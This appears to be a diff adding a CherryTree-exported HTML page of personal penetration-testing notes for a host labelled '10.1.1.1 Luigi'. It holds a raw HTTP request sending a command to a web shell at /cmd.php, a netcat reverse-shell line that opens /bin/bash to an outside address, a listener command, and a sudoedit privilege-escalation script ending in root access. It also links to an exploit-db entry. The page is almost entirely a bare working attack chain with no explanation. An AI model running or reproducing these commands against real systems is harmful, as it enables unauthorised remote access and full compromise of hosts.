@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>10.1.1.1 Luigi</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>10.1.1.1 Luigi</h1><br/>POST /cmd.php HTTP/1.1<br />Host: 10.1.1.1<br />X-Forwarded-For: 10.3.3.88<br />Accept: application/vnd.web-console.v2<br />X-Requested-With: <br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 11<br />Origin: 10.3.3.88<br />Connection: close<br />Referer: 10.3.3.88<br /><br />data=whoami<br /><br /><br /><br /><br /><br />nc 192.168.119.132 8080 -e /bin/bash<br />nc -nlvp<br /><br /><br /><br />cd /tmp<br />cat &gt; sudoedit &lt;&lt; _EOF<br />#!/bin/sh<br />echo ALEX-ALEX<br />su<br />/bin/su<br />/usr/bin/su<br />_EOF<br />chmod a+x ./sudoedit<br />sudo ./sudoedit <a href="file:///etc/apache2/apache2.conf">/etc/apache2/apache2.conf</a><br />whoami<br />	root<br />	<br />	<br />	<br /><a href="https://www.exploit-db.com/exploits/11651">https://www.exploit-db.com/exploits/11651</a><br /><br /><br /><br /><br /><br /><br /><br /></div></body></html>
